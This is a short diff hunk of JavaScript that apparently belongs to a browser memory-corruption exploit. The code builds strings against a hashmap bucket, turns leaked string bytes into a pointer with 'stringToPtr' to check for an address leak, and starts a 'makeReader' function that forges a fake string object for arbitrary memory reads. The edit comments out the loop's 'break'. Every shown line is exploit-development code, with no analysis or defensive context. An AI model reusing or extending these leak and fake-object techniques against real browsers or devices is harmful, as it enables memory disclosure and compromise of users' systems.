@@ -685,7 +685,7 @@ var badstr2 = mkString(HASHMAP_BUCKET, p_s);
 needfix.push(mkString(HASHMAP_BUCKET, p_s));
 var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
 if (leak < 0x1000000000000)
-break;
+//break;
 }
 function makeReader(read_addr, ffs_name) {
 var fake_s = '';
